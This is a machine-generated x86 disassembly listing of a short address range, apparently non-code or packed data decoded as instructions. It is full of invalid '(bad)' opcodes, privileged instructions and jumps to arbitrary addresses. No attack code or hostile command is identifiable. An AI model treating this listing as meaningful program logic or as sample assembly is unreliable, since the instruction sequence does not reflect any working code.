  4249eb:	test   eax,0x26c24a03
  4249f0:	retf   0xa698
  4249f3:	std    
  4249f4:	inc    ebx
  4249f5:	jne    0x4249af
  4249f7:	in     al,0x23
  4249f9:	mov    edi,0x44ffe943
  4249fe:	ss scas al,BYTE PTR es:[edi]
  424a00:	fisttp DWORD PTR [eax-0xefc1638]
  424a06:	ret    0x45b5
  424a09:	mov    esi,0x7af4e915
  424a0e:	add    ch,BYTE PTR [esi-0x8]
  424a11:	pop    edx
  424a12:	fisub  WORD PTR [esi-0x227e93fd]
  424a18:	add    al,0x75
  424a1a:	add    bh,BYTE PTR [ecx+eiz*1+0x0]
  424a1e:	add    BYTE PTR [eax],al
  424a20:	add    BYTE PTR [eax],al
  424a22:	bnd jno 0x424a16
  424a25:	add    al,0x75
  424a27:	add    ch,BYTE PTR [ecx+edx*8+0x1]
  424a2b:	loop   0x4249bf
  424a2d:	retf   0xa268
  424a30:	std    
  424a31:	inc    ebx
  424a32:	jne    0x4249b9
  424a34:	test   eax,0x3953884f
  424a39:	xor    al,0xc5
  424a3b:	rep lods eax,DWORD PTR ds:[esi]
  424a3d:	mov    bh,BYTE PTR [ebp-0x22]
  424a40:	es add al,0x4d
  424a43:	inc    edi
  424a44:	mov    bl,0xc9
  424a46:	dec    esi
  424a47:	pop    ebx
  424a48:	add    dl,bh
  424a4a:	ss pop esp
  424a4c:	mov    edi,0xbf5c3762
  424a51:	inc    edi
  424a52:	sub    al,0xe5
  424a54:	sti    
  424a55:	cli    
  424a56:	mov    dh,0x2
  424a58:	jg     0x424a6f
  424a5a:	push   ebp
  424a5b:	push   es
  424a5c:	add    BYTE PTR ds:0xcd7c3f6e,dl
  424a62:	sbb    bh,BYTE PTR [esp+esi*2+0x74b493bb]
  424a69:	(bad)  
  424a6a:	and    al,0x5
  424a6c:	and    BYTE PTR [edi-0x22fbfd48],cl
  424a72:	pop    ebx
  424a73:	stos   BYTE PTR es:[edi],al
  424a74:	enter  0x7924,0x2
  424a78:	test   BYTE PTR [ecx],ch
  424a7a:	inc    ebp
  424a7b:	push   ds
  424a7c:	mov    eax,ds:0xffff0d01
  424a81:	jno    0x424a74
  424a83:	add    DWORD PTR [ecx],eax
  424a85:	jmp    0x424a8a
  424a8a:	add    BYTE PTR [esi-0x77],dh
  424a8d:	inc    edx
  424a8e:	fst    QWORD PTR [edi]
  424a90:	jmp    0xed80:0x8776aadb
  424a97:	ja     0x424a9b
  424a99:	add    BYTE PTR [eax+0x37],dh
  424a9c:	sbb    bh,BYTE PTR [esi-0x78ab8913]
  424aa2:	xchg   ebp,eax
  424aa3:	or     BYTE PTR [edx],0x53
  424aa6:	push   es
  424aa7:	inc    ebp
  424aa8:	out    0x17,al
  424aaa:	inc    BYTE PTR [edx-0x1a]
  424aad:	pop    ss
  424aae:	idiv   BYTE PTR [edx]
  424ab0:	out    0x17,al
  424ab2:	xchg   edi,eax
  424ab3:	lods   eax,DWORD PTR ds:[esi]
  424ab4:	adc    al,0xe4
  424ab6:	cli    
  424ab7:	add    al,BYTE PTR ss:[edi-0x63555a1f]
  424abe:	(bad)  
  424abf:	cmp    eax,0x8da687ba
  424ac4:	pop    eax
  424ac5:	mov    esi,0x4e023c00
  424aca:	mov    ecx,DWORD PTR [eax+0x35707e2]
  424ad0:	dec    esi
  424ad1:	and    al,0x18
  424ad3:	adc    ecx,DWORD PTR [esi+0x24]
  424ad6:	sbb    BYTE PTR [ebx],dl
  424ad8:	dec    esi
  424ad9:	and    al,0x18
  424adb:	push   0xffffffcb
  424add:	adc    eax,0x422fdc
  424ae2:	mov    eax,DWORD PTR [ebx+esi*8]
  424ae5:	out    0x74,eax
  424ae7:	repz retf 0x8bf7
  424aeb:	fucomi st,st(2)
  424aed:	push   ebp
  424aee:	ret    0x0
  424af1:	add    BYTE PTR [eax],al
  424af3:	add    BYTE PTR [edx+eax*1],ch
  424af6:	push   ebp
  424af7:	mov    eax,DWORD PTR [eax+0x47582f3]
  424afd:	repz div BYTE PTR [ebp+0x74]
  424b01:	retf   
  424b02:	jne    0x424b18
  424b04:	inc    ebx
  424b05:	dec    esp
  424b06:	adc    bh,bh
  424b08:	leave  
  424b09:	mov    ch,0x51
  424b0b:	(bad)  
  424b0c:	mov    ecx,0xdc401495
  424b11:	ds clc 
  424b13:	push   edi
  424b14:	xor    al,0xff
  424b16:	idiv   bh
  424b18:	xchg   ebx,eax
  424b19:	ds mov edi,0xb9e4b25f
  424b1f:	adc    al,0x9c
  424b21:	in     al,dx
  424b22:	sub    ah,0xea
  424b25:	ds jne 0x424b30
  424b28:	jmp    0x424af4
  424b2a:	jne    0x424b44
  424b2c:	jae    0x424b7a
  424b2e:	adc    al,0xff
  424b30:	or     DWORD PTR [ecx-0xc6f8a0a],esi
  424b36:	not    BYTE PTR ds:0x3bad68
  424b3c:	pop    es
  424b3d:	into   
  424b3e:	dec    edi
  424b3f:	call   0x3a0fb7
  424b44:	jne    0x424b66
  424b46:	mov    ebx,0xbdeec35b
  424b4b:	adc    al,0x75
  424b4d:	push   ds
  424b4e:	ja     0x424b3c
  424b50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b51:	mov    eax,0xf63637a6
  424b56:	xrelease xchg BYTE PTR [eax],al
  424b59:	add    BYTE PTR [eax],al
  424b5b:	add    BYTE PTR [eax],al
  424b5d:	mov    al,0xdf
  424b5f:	xlat   BYTE PTR ds:[ebx]
  424b60:	ficom  WORD PTR [edi+0x3636ffab]
  424b66:	push   ds
  424b67:	add    BYTE PTR [edi],ch
  424b69:	xor    eax,0xc64f1880
  424b6e:	mov    WORD PTR [ecx+0x10],ss
  424b71:	ret    
  424b72:	sbb    eax,ebx
  424b74:	jne    0x424af7
  424b76:	sbb    bl,al
  424b78:	jne    0x424bf7
  424b7a:	xor    al,0xf1
  424b7c:	addr16 fs jmp 0x424b83
  424b80:	aaa    
  424b81:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  424b83:	fstp   TBYTE PTR [ecx]
  424b85:	push   eax
  424b86:	mov    ebx,0xa6f80b45
  424b8b:	(bad)  
  424b8e:	dec    esp
  424b8f:	push   eax
  424b90:	add    ebx,DWORD PTR [esi-0x58831092]
  424b96:	xor    ch,ch
  424b98:	push   esi
  424b99:	sub    cl,ch
  424b9b:	idiv   edi
  424b9d:	sub    DWORD PTR [eax],esp
  424b9f:	fadd   DWORD PTR [edi+0x532dbb30]
  424ba5:	pop    ds
  424ba6:	stos   DWORD PTR es:[edi],eax
  424ba7:	ret    0x7975
  424baa:	fmul   st,st(5)
  424bac:	sti    
  424bad:	sub    BYTE PTR [ebx+0x39a9ad7],ah
  424bb3:	ret    
  424bb4:	xchg   DWORD PTR [ebp+0x717bc325],ecx
  424bba:	js     0x424b7b
  424bbc:	out    0x3f,eax
  424bbe:	fs sub ch,al
  424bc1:	add    BYTE PTR [eax],al
  424bc3:	add    BYTE PTR [eax],al
  424bc5:	add    BYTE PTR [ecx],bh
  424bc7:	add    bh,BYTE PTR [edi]
  424bc9:	add    al,0x75
  424bcb:	xchg   ecx,ebx
  424bcd:	and    BYTE PTR [edi+0x37],0xc2
  424bd1:	jp     0x424b8b
  424bd3:	adc    dh,BYTE PTR [esi]
  424bd5:	das    
  424bd6:	pop    esi
  424bd7:	ss cmc 
  424bd9:	js     0x424b89
  424bdb:	mov    ebx,0xaa7d50ba
  424be0:	cmp    eax,0xeebc3ec7
  424be5:	ret    0x8c1
  424be8:	cmp    ebx,esp
  424bea:	ins    BYTE PTR es:[edi],dx
  424beb:	pop    eax
  424bec:	jmp    0x7f04a5f4
  424bf1:	cli    
  424bf2:	sti    
  424bf3:	inc    ebp
  424bf4:	cmc    
  424bf5:	xor    BYTE PTR ds:0x6d7ce737,0x87
  424bfc:	mov    ds:0x145cae2a,eax
  424c01:	ret    0x265
  424c04:	sbb    ah,bl
  424c06:	clc    
  424c07:	pop    ecx
  424c08:	jmp    0x51947e10
  424c0d:	in     eax,dx
  424c0e:	inc    eax
  424c0f:	add    ch,cl
  424c11:	ret    0x8748
  424c14:	cmp    eax,0x6c542a34
  424c19:	(bad)  
  424c1a:	dec    eax
  424c1b:	loopne 0x424c12
  424c1d:	stos   BYTE PTR es:[edi],al
  424c1e:	call   0x9654:0x6d405eb4
  424c25:	mov    BYTE PTR [eax+0x12],0x22
  424c29:	push   eax
  424c2a:	add    BYTE PTR [eax],al
  424c2c:	add    BYTE PTR [eax],al
  424c2e:	add    BYTE PTR [ecx-0x5058f956],al
  424c34:	mov    ebx,0xb4f8d35e
  424c39:	nop
  424c3a:	push   cs
  424c3b:	sub    ch,BYTE PTR [edx+0x2752c0e]
  424c41:	push   cs
  424c42:	adc    dl,dh
  424c44:	inc    ebp
  424c45:	add    cl,ah
  424c47:	sbb    al,0xbc
  424c49:	mov    WORD PTR [edx+esi*4+0x53],?
  424c4d:	call   0x44e87d
  424c52:	xor    DWORD PTR fs:0xbeb26225,esi
  424c59:	inc    edx
  424c5a:	inc    edx
  424c5b:	sub    edi,DWORD PTR [ebx-0x5dc9507a]
  424c61:	(bad)  
  424c62:	sbb    BYTE PTR [ecx],ch
  424c64:	gs pop ecx
  424c66:	jmp    0x651acfe1
  424c6b:	or     al,0x35
  424c6d:	mov    eax,0xe75a3f13
  424c72:	icebp  
  424c73:	stos   DWORD PTR es:[edi],eax
  424c74:	mov    bh,0x74
  424c76:	jmp    0x424c17
  424c78:	pop    ss
  424c79:	xchg   DWORD PTR [edi-0x5436acad],esp
  424c7f:	or     eax,0x2d7254bb
  424c84:	cmp    esp,esp
  424c86:	jno    0x424c7e
  424c88:	lods   eax,DWORD PTR ds:[esi]
  424c89:	nop
  424c8a:	call   0xedcf4f05
  424c8f:	xchg   edx,eax
  424c90:	push   edx
  424c91:	push   0xeb
  424c96:	add    BYTE PTR [eax],al
  424c98:	je     0x424c9c
  424c9a:	add    BYTE PTR [esi-0x2e],dl
  424c9d:	rcl    BYTE PTR ds:0xd8af76a9,cl
  424ca3:	loop   0x424c5b
  424ca5:	inc    ecx
  424ca6:	xchg   DWORD PTR [edx+edx*4+0x7b],eax
  424caa:	sti    
  424cab:	or     al,0xcd
  424cad:	adc    BYTE PTR [eax-0x17],al
  424cb0:	stc    
  424cb1:	jmp    DWORD PTR [edi-0x7ffdc68d]
  424cb7:	(bad)  
  424cb9:	fdivr  QWORD PTR [edi]
  424cbb:	jmp    0xb67a8236
  424cc0:	icebp  
  424cc1:	or     edx,ebx
  424cc3:	add    bh,bl
  424cc5:	dec    BYTE PTR [esi-0x1]
  424cc8:	mov    eax,ds:0x8c400da6
  424ccd:	jle    0x424d0c
  424ccf:	fsubr  DWORD PTR [ecx+0x41]
  424cd2:	add    BYTE PTR [eax],al
  424cd4:	shr    DWORD PTR [ebx+eiz*8-0x840b454],1
  424cdb:	test   BYTE PTR [edx+ecx*2],cl
  424cde:	adc    edi,eax
  424ce0:	push   ecx
  424ce1:	(bad)  
  424ce2:	fld    QWORD PTR [ebx+0x5c]
  424ce5:	dec    edi
  424ce6:	pop    ds
  424ce7:	inc    edx
  424ce8:	pop    esp
  424ce9:	js     0x424cf0
  424ceb:	fsubr  st,st(1)
  424ced:	inc    edx
  424cee:	add    BYTE PTR [ecx],al
  424cf0:	arpl   WORD PTR [edi+0x462e1c15],di
  424cf6:	add    BYTE PTR [edi-0x5a],bl
  424cf9:	stc    
  424cfa:	and    eax,DWORD PTR [eax+eax*1]
  424cfd:	add    BYTE PTR [eax],al
  424cff:	add    BYTE PTR [eax],al
  424d01:	(bad)  
  424d02:	out    dx,eax
  424d03:	add    edi,edi
  424d05:	(bad)  
  424d06:	push   edi
  424d07:	or     BYTE PTR [eax],al
  424d09:	test   bh,dh
  424d0b:	or     ecx,DWORD PTR [edx-0x77f81db0]
  424d11:	push   edx
  424d12:	mov    cl,0x82
  424d14:	(bad)  
  424d15:	into   
  424d16:	mov    ebp,0xd46755fb
  424d1b:	call   0x4829fe
  424d20:	not    BYTE PTR [eax]
  424d22:	sbb    cl,BYTE PTR [eax]
  424d24:	add    eax,eax
  424d26:	mov    bh,0x51
  424d28:	call   0x4239f4
  424d2d:	inc    edi
  424d2e:	ja     0x424d86
  424d30:	ret    0x5d0
  424d33:	push   ebp
  424d34:	mov    edi,DWORD PTR [eax-0x7c]
  424d37:	in     al,dx
  424d38:	js     0x424cd7
  424d3a:	add    eax,0x9d92c700
  424d3f:	add    BYTE PTR [eax+0x75],0xab
  424d43:	jg     0x424d82
  424d45:	mov    ebp,0x75003fe6
  424d4a:	cwde   
  424d4b:	dec    edx
  424d4c:	xor    cl,dl
  424d4e:	mov    bl,0xa5
  424d50:	aas    
  424d51:	jne    0x424ceb
  424d53:	les    edx,FWORD PTR ds:0x3fdd5d
  424d59:	cmc    
  424d5a:	fstp   st(3)
  424d5c:	fnsave [esi+0x7f74ffab]
  424d62:	ret    
  424d63:	out    0xfa,al
  424d65:	add    BYTE PTR [eax],al
  424d67:	add    BYTE PTR [eax],al
  424d69:	add    BYTE PTR [edx-0x38],bl
  424d6c:	mov    al,al
  424d6e:	leave  
  424d6f:	fcmovb st,st(6)
  424d71:	add    eax,0x439629
  424d76:	ror    BYTE PTR [eax],cl
  424d78:	inc    edx
  424d79:	add    BYTE PTR [ebx],dh
  424d7b:	sahf   
  424d7c:	xlat   BYTE PTR ds:[ebx]
  424d7d:	fnsave [esi+0x2a5304ab]
  424d83:	scas   al,BYTE PTR es:[edi]
  424d84:	sbb    ecx,DWORD PTR [esi]
  424d86:	mov    ch,0xab
  424d88:	nop
  424d89:	inc    ebp
  424d8a:	sbb    ebx,edi
  424d8c:	nop
  424d8d:	test   ebp,edi
  424d8f:	cmp    BYTE PTR [edi+0x813a5fb],0x20
  424d96:	jne    0x424d43
  424d98:	daa    
  424d99:	sti    
  424d9a:	cli    
  424d9b:	stos   BYTE PTR es:[edi],al
  424d9c:	(bad)  
  424d9d:	cli    
  424d9e:	push   0x74747eb3
  424da3:	stos   DWORD PTR es:[edi],eax
  424da4:	dec    DWORD PTR [eax+0x15bf4f60]
  424daa:	test   DWORD PTR [ecx-0x1507ffc1],esi
  424db0:	aaa    
  424db1:	mov    cr4,esi
  424db4:	mov    DWORD PTR [eax+0x66beefc3],ecx
  424dba:	jne    0x424d57
  424dbc:	mov    esi,0xfb024515
  424dc1:	inc    ebx
  424dc2:	jne    0x424d49
  424dc4:	and    eax,0xd772210
  424dc9:	ret    0xb89e
  424dcc:	jecxz  0x424e30
  424dce:	add    BYTE PTR [eax],al
  424dd0:	add    BYTE PTR [eax],al
  424dd2:	add    BYTE PTR [ecx],cl
  424dd4:	adc    eax,0xb7918166
  424dd9:	cli    
  424dda:	ret    0x964
  424ddd:	pop    esp
  424dde:	les    edi,FWORD PTR [edi-0x37]
  424de1:	lds    eax,FWORD PTR ds:0xaef440fd
  424de7:	jno    0x424da9
  424de9:	and    edx,DWORD PTR [ecx]
  424deb:	je     0x424d78
  424ded:	ins    BYTE PTR es:[edi],dx
  424dee:	xlat   BYTE PTR ds:[ebx]
  424def:	pop    edi
  424df0:	mov    eax,0x21aabca
  424df5:	jmp    0xf16317fd
  424dfa:	add    ebp,ebp
  424dfc:	inc    eax
  424dfd:	in     eax,0x8e
  424dff:	mov    al,0xa
  424e01:	pusha  
  424e02:	dec    ecx
  424e03:	jns    0x424d90
  424e05:	stos   DWORD PTR es:[edi],eax
  424e06:	int3   
  424e07:	jmp    0x424e07
  424e09:	call   0xaaf44867
  424e0e:	add    al,0xcd
  424e10:	mov    WORD PTR [ecx],gs
  424e12:	add    al,0x1d
  424e14:	sub    cl,0x3
  424e17:	jne    0x424e71
  424e19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e1a:	xchg   BYTE PTR [edi-0x2],bh
  424e1d:	jno    0x424e56
  424e1f:	cli    
  424e20:	addr16 call 0xabb2ccec
  424e26:	adc    BYTE PTR ds:0x694bec2e,bh
  424e2c:	add    edx,DWORD PTR [edi]
  424e2e:	les    ebx,FWORD PTR [edx]
  424e30:	sub    eax,0x115b5ce7
  424e35:	dec    esi
  424e36:	or     BYTE PTR [eax],al
  424e38:	add    BYTE PTR [eax],al
  424e3a:	add    BYTE PTR [eax],al
  424e3c:	call   0x8c:0x772da8c9
  424e43:	scas   eax,DWORD PTR es:[edi]
  424e44:	push   0x50
  424e46:	call   0x44c7eb
  424e4b:	mov    ebx,0xf4fb5241
  424e50:	mov    ss,WORD PTR [ecx]
  424e52:	inc    eax
  424e53:	jmp    0x11c218fb
  424e58:	mov    bh,0x89
  424e5a:	inc    edx
  424e5b:	in     eax,dx
  424e5c:	addr16 (bad) 
  424e5e:	shr    BYTE PTR [edx],0xfb
  424e61:	cmp    al,0x8
  424e63:	jmp    0x6f7b51aa
  424e68:	xchg   BYTE PTR [ebx],cl
  424e6a:	xchg   esp,eax
  424e6b:	test   eax,0xed15bb30
  424e70:	jl     0x424eb4
  424e72:	add    BYTE PTR [eax-0x51],ah
  424e75:	or     al,BYTE PTR [ebp+0x53188da9]
  424e7b:	sbb    DWORD PTR [esp+esi*1],esi
  424e7e:	add    al,0xbe
  424e80:	push   0xfffffffe
  424e82:	adc    DWORD PTR [ecx],ebp
  424e84:	jno    0x424f03
  424e86:	shl    BYTE PTR [edi+edi*2],0x89
  424e8a:	jp     0x424e85
  424e8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424e8d:	add    DWORD PTR [edi-0x4f5a062],edi
  424e93:	cld    
  424e94:	fimul  WORD PTR [eax+eax*2]
  424e97:	jmp    0xe94a7295
  424e9c:	add    BYTE PTR [edi-0x41],dh
  424e9f:	jb     0x424ea1
  424ea1:	add    BYTE PTR [eax],al
  424ea3:	add    BYTE PTR [eax],al
  424ea5:	scas   eax,DWORD PTR es:[edi]
  424ea6:	(bad)  
  424ea7:	jle    0x424f1a
  424ea9:	xor    al,0x2e
  424eab:	adc    al,BYTE PTR [ebx]
  424ead:	jnp    0x424f01
  424eaf:	sti    
  424eb0:	cld    
  424eb1:	mov    ss,WORD PTR [eax+eax*2]
  424eb4:	jmp    0x5646826e
  424eb9:	sub    dh,0x11
  424ebc:	test   eax,0x4a3776
  424ec1:	fadd   st,st(1)
  424ec3:	add    DWORD PTR [esi-0x3c],0x7f
  424ec7:	shl    BYTE PTR [edi+edx*8+0x52],0xf7
  424ecc:	adc    eax,0x400f64
  424ed1:	pop    ds
  424ed2:	in     al,dx
  424ed3:	pop    es
  424ed4:	add    BYTE PTR [edi+0x4f],cl
  424ed7:	sub    esp,0xf
  424eda:	jb     0x424f28
  424edc:	push   esi
  424edd:	pop    ss
  424ede:	outs   dx,BYTE PTR ds:[esi]
  424edf:	bound  eax,QWORD PTR [ecx]
  424ee1:	jae    0x424edf
  424ee3:	add    edi,edi
  424ee5:	test   eax,0x8c400e1a
  424eea:	jg     0x424eac
  424eec:	jne    0x424ef9
  424eee:	xchg   esi,edi
  424ef0:	imul   edi,DWORD PTR [ebp+eax*4+0x4d],0xc6879de0
  424ef8:	call   FWORD PTR [edx+ecx*1+0x73c3c085]
  424eff:	je     0x424f4c
  424f01:	xor    ecx,DWORD PTR ds:0xfe8c15cc
  424f07:	cmp    al,0x33
  424f09:	add    BYTE PTR [eax],al
  424f0b:	add    BYTE PTR [eax],al
  424f0d:	add    BYTE PTR [ebx-0x2],ch
  424f10:	push   DWORD PTR [ebx+ebp*1-0x16]
  424f14:	(bad)  
  424f16:	sbb    al,0x2
  424f18:	lea    eax,[ebp-0x38]
  424f1b:	push   ecx
  424f1c:	add    DWORD PTR [ebp+0x14],0xffffffe8
  424f20:	and    al,ch
  424f22:	jo     0x424f21
  424f24:	(bad)  
  424f25:	call   FWORD PTR [ecx-0x75df8a3f]
  424f2b:	cmp    al,0xb4
  424f2d:	and    al,bh
  424f2f:	cld    
  424f30:	cmp    BYTE PTR [ebp+0x10],al
  424f33:	in     eax,dx
  424f34:	pop    ds
  424f35:	neg    BYTE PTR [ecx]
  424f37:	add    DWORD PTR cs:[esp+edx*1+0x7f],esi
  424f3c:	jge    0x424ef6
  424f3e:	jne    0x424eeb
  424f40:	xor    ebp,DWORD PTR [esi-0x488312e]
  424f46:	pusha  
  424f47:	mov    ebx,0xb9754019
  424f4c:	mov    edi,0x2e9ac5a
  424f51:	add    ch,ah
  424f53:	stos   BYTE PTR es:[edi],al
  424f54:	lods   al,BYTE PTR ds:[esi]
  424f55:	rep stos BYTE PTR es:[edi],al
  424f57:	xchg   esi,eax
  424f58:	retf   
  424f59:	out    0x8f,eax
  424f5b:	outs   dx,BYTE PTR ds:[esi]
  424f5c:	mov    esp,gs
  424f5e:	hlt    
  424f5f:	push   DWORD PTR [esi]
  424f61:	add    DWORD PTR [ebp-0x55],esi
  424f64:	mov    al,BYTE PTR [ebp-0x77]
  424f67:	fwait
  424f68:	mov    al,BYTE PTR [ebp-0x4444a13]
  424f6e:	and    eax,0x200383
  424f73:	add    BYTE PTR [eax],al
  424f75:	add    BYTE PTR [eax],al
  424f77:	jne    0x424f24
  424f79:	daa    
  424f7a:	sti    
  424f7b:	push   0xffffffab
  424f7d:	(bad)  
  424f7e:	cli    
  424f7f:	call   0x59881237
  424f84:	push   edi
  424f85:	add    eax,0x19c47500
  424f8a:	adc    BYTE PTR [ebx-0x15],ah
  424f8d:	add    eax,DWORD PTR [ebp-0x78ef11cb]
  424f93:	lock xchg esi,eax
  424f95:	mov    edx,0x20c332fb
  424f9a:	add    BYTE PTR [ebp-0x55],dh
  424f9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f9e:	(bad)  
  424f9f:	fs imul ecx,ebp,0xffffffbe
  424fa3:	jno    0x424f50
  424fa5:	or     dh,BYTE PTR [edx+0x637e335]
  424fab:	mov    ebp,0x352efeb7
  424fb0:	push   0x689d1326
  424fb5:	dec    BYTE PTR es:[edx+0x68]
  424fb9:	dec    esp
  424fba:	dec    eax
  424fbb:	popa   
  424fbc:	add    ch,dh
  424fbe:	or     ch,0xe
  424fc1:	aad    0x2
  424fc3:	mov    eax,edx
  424fc5:	es je  0x424f9b
  424fc8:	mov    edi,0x50a0599
  424fcd:	jnp    0x425013
  424fcf:	jno    0x42501b
  424fd1:	mov    ch,0x9
  424fd3:	sub    eax,0xf2f2e62e
  424fd8:	sar    BYTE PTR [edi+0x1f],0x0
  424fdf:	add    BYTE PTR [ebp-0x3f],cl
  424fe2:	(bad)  
  424fe3:	adc    edi,DWORD PTR ds:0x7576eac1
  424fe9:	dec    edx
  424fea:	mov    eax,ds:0x1818137
  424fef:	sbb    DWORD PTR [ecx],eax
  424ff1:	add    DWORD PTR [esi-0x22d83d3d],esi
  424ff7:	pop    ebx
  424ff8:	mov    edx,0x325bd927
  424ffd:	dec    esi
  424ffe:	pop    esi
  424fff:	mov    al,0xc4
  425001:	xchg   DWORD PTR [ebx-0x254bd355],ebp
  425007:	mov    esi,0xbee928c5
  42500c:	enter  0x600a,0x48
  425010:	dec    ecx
  425011:	mov    ah,0xdc
  425013:	push   ebx
  425014:	addr16 inc edx
  425016:	jmp    0x6449819d
  42501b:	dec    eax
  42501c:	xor    DWORD PTR [ebx-0x56],edx
  42501f:	cmp    BYTE PTR [ebp-0x4d],bh
  425022:	sbb    ecx,DWORD PTR [eax]
  425024:	push   ds
  425025:	push   cs
  425026:	test   DWORD PTR [eax],ebx
  425028:	mov    ch,0x2
  42502a:	call   0xcbcd:0x29c26adb
  425031:	(bad)  
  425032:	call   0x18e94a8f
  425037:	mov    esi,DWORD PTR [edi]
  425039:	stos   DWORD PTR es:[edi],eax
  42503a:	add    BYTE PTR [edx+0x33],bl
  42503d:	mov    eax,0x29f19fb
  425042:	sti    
  425043:	fadd   QWORD PTR [eax]
  425045:	add    BYTE PTR [eax],al
  425047:	add    BYTE PTR [eax],al
  425049:	outs   dx,BYTE PTR ds:[esi]
  42504a:	mov    DWORD PTR [ebp+0x5d],eax
  42504d:	sbb    ecx,DWORD PTR [esi]
  42504f:	push   eax
  425050:	push   DWORD PTR [esi]
  425052:	add    bh,BYTE PTR [edi+0x25]
  425055:	jp     0x424fdc
  425057:	inc    ebp
  425058:	inc    ebp
  425059:	es mov bh,0x75
  42505c:	icebp  
  42505d:	sti    
  42505e:	xor    BYTE PTR [esi+esi*1],al
  425061:	lea    esp,[esi-0x508956eb]
  425067:	fadd   DWORD PTR [edx]
  425069:	mov    ecx,0x722bc942
  42506e:	add    bh,bl
  425070:	popf   
  425071:	call   0x70b7:0x7e99faff
  425078:	in     eax,dx
  425079:	ret    
  42507a:	or     eax,0x236d700
  42507f:	repz adc DWORD PTR [edi+0x722b40c2],ecx
  425086:	add    dl,BYTE PTR [ebp+0x72]
  425089:	and    eax,0xc419ec33
  42508e:	push   eax
  42508f:	push   ebx
  425090:	bound  eax,QWORD PTR [esi]
  425092:	jnp    0x42506c
  425094:	rcr    ebp,0xb5
  425097:	sti    
  425098:	(bad)  
  425099:	in     eax,dx
  42509a:	shl    DWORD PTR [edi+esi*8-0x74],0xe3
  42509f:	pop    edx
  4250a0:	rcl    DWORD PTR [ecx-0x4b],0xfb
  4250a4:	scas   al,BYTE PTR es:[edi]
  4250a5:	std    
  4250a6:	shl    DWORD PTR [ebx+edx*8+0x71],0x6f
  4250ab:	jmp    FWORD PTR [ecx+0x0]
  4250ae:	add    BYTE PTR [eax],al
  4250b0:	add    BYTE PTR [eax],al
  4250b2:	fnstenv [ebx+0x125cec74]
  4250b8:	pop    eax
  4250b9:	cmp    BYTE PTR [ebx-0x1d],0xc8
  4250bd:	add    BYTE PTR [edi-0x5ef0f08a],cl
  4250c3:	mov    edi,0x816b418d
  4250c8:	loopne 0x4250e6
  4250ca:	mov    WORD PTR [ecx-0x9],ss
  4250cd:	jbe    0x42509f
  4250cf:	jne    0x4250e6
  4250d1:	fsubr  st(1),st
  4250d3:	add    BYTE PTR ds:[ebp-0x74de0564],al
  4250da:	jns    0x4250ae
  4250dc:	adc    eax,0xcf75cc40
  4250e1:	mov    ebx,0xfffb9dbf
  4250e6:	adc    eax,0x5f3bfc3b
  4250eb:	cli    
  4250ec:	add    eax,0xf7735ce8
  4250f1:	(bad)  
  4250f2:	jnp    0x4250df
  4250f4:	sti    
  4250f5:	call   DWORD PTR [ecx-0x63bfee52]
  4250fb:	jne    0x4250cc
  4250fd:	cmp    ecx,DWORD PTR [edi-0x15]
  425100:	sub    ebx,ebp
  425102:	xchg   BYTE PTR [esi],ch
  425104:	add    ebx,ebp
  425106:	cmp    bh,BYTE PTR [eax+0x45]
  425109:	ror    BYTE PTR [ecx+edi*8+0xe],1
  42510d:	inc    ecx
  42510f:	dec    BYTE PTR [ebp+eax*2+0x4583561c]
  425116:	add    BYTE PTR [eax],al
  425118:	add    BYTE PTR [eax],al
  42511a:	add    BYTE PTR [eax-0x24],bl
  42511d:	psubsb mm1,QWORD PTR [eax-0x2efffffd]
  425124:	lds    esi,FWORD PTR [ebp+eiz*8+0x27]
  425128:	(bad)  
  425129:	jp     0x4251a8
  42512b:	inc    eax
  42512c:	push   es
  42512d:	je     0x425108
  42512f:	(bad)  
  425131:	jecxz  0x425132
  425133:	and    DWORD PTR [esi-0x4bf3bfef],esi
  425139:	mov    ebx,0x58f9755f
  42513e:	leave  
  42513f:	aaa    
  425140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425141:	call   DWORD PTR [ecx-0x12]
  425144:	sub    esi,eax
  425146:	mov    edi,0x10ab1f5
  42514b:	dec    edx
  42514c:	test   al,0x92
  42514e:	sar    al,0xb3
  425151:	mov    esp,0x8a9eda7f
  425156:	jnp    0x4251ce
  425158:	push   ebx
  425159:	stos   DWORD PTR es:[edi],eax
  42515a:	cld    
  42515b:	rcr    BYTE PTR [eax-0x7d],cl
  42515e:	rol    BYTE PTR [ecx-0x71],0xa7
  425162:	pop    ds
  425163:	ror    BYTE PTR [eax-0x44],0x84
  425167:	mov    ch,0x77
  425169:	inc    eax
  42516a:	or     ebp,edx
  42516c:	pushf  
  42516d:	cmp    al,0x77
  425170:	jbe    0x425174
  425172:	test   bx,ax
  425175:	test   al,0xa
  425177:	data16 bnd jg 0x425173
  42517b:	push   0xffffffa8
  42517d:	xchg   edx,eax
  42517e:	rol    DWORD PTR [eax],0x0
  425181:	add    BYTE PTR [eax],al
  425183:	add    al,bh
  425185:	pop    edx
  425186:	mov    esp,0x4fa7957f
  42518b:	dec    edi
  42518c:	jp     0x4251c7
  42518e:	add    edi,ebx
  425190:	mov    BYTE PTR [edi+0x26754015],bh
  425196:	mov    edi,0x361b7c75
  42519b:	or     eax,0x66075674
  4251a0:	imul   ebx,eax,0xb64a042e
  4251a6:	repz adc DWORD PTR [ebp-0x3f3f7f65],esi
  4251ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4251ae:	outs   dx,DWORD PTR ds:[esi]
  4251af:	add    DWORD PTR [esi],ebx
  4251b1:	shl    DWORD PTR [esi+0x3fd63915],1
  4251b7:	add    dh,ch
  4251b9:	add    DWORD PTR [ecx-0x65509054],esp
  4251bf:	mov    ebx,0xf3fcb1a6
  4251c4:	fs inc edx
  4251c6:	jmp    0x239314c0
  4251cb:	(bad)  
  4251cc:	mov    al,ds:0xe1858d7d
  4251d1:	xchg   ecx,eax
  4251d2:	jmp    0xff97c6da
  4251d7:	cmp    eax,esi
  4251d9:	xchg   bl,bl
  4251db:	mov    edx,0x3cfb0de
  4251e0:	and    eax,0x7447639a
  4251e5:	add    bl,BYTE PTR [esi+0x41]
  4251e8:	add    BYTE PTR [eax],al
  4251ea:	add    BYTE PTR [eax],al
  4251ec:	add    BYTE PTR [ebp+0x7c],ch
  4251ef:	test   eax,0xedc63a07
  4251f4:	stos   DWORD PTR es:[edi],eax
